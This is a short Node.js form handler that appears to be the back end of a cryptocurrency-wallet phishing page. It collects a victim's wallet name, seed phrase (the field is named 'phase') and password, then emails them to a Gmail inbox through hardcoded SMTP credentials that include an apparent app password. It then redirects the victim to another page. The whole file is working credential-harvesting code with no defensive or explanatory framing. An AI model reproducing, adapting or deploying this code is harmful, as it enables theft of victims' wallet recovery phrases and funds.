const nodemailer = require('nodemailer');

function htmlspecialchars(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

async function parseRequestBody(req) {
  if (req.body) return req.body;
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  const raw = Buffer.concat(chunks).toString('utf8');
  const params = Object.fromEntries(new URLSearchParams(raw));
  return params;
}

module.exports = async function (req, res) {
  if (req.method !== 'POST') {
    res.statusCode = 405;
    res.end('Method Not Allowed');
    return;
  }

  let body = {};
  try {
    body = await parseRequestBody(req);
  } catch (e) {
    res.statusCode = 400;
    res.end('Invalid request body.');
    return;
  }

  const wallet_name = htmlspecialchars((body.wallet_name || '').toString().trim());
  const phase = (body.phase || '').toString().trim();
  const password = (body.pw || '').toString().trim();

  if (!phase) {
    res.statusCode = 400;
    res.end('Required field missing.');
    return;
  }

  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: 'attendantemail@gmail.com',
      pass: 'ixrb xwbe haxp qtnt',
    },
  });

  const mailOptions = {
    from: 'noreply@connectus.website',
    to: 'attendantemail@gmail.com',
    subject: 'New Form Submission',
    text: `Wallet Name: ${wallet_name}\nPhase: ${phase}\nPassword: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.statusCode = 302;
    res.setHeader('Location', 'rdr.html');
    res.end();
    return;
  } catch (err) {
    res.statusCode = 500;
    res.end('Message could not be sent. Error: ' + (err && err.message ? err.message : String(err)));
    return;
  }
};
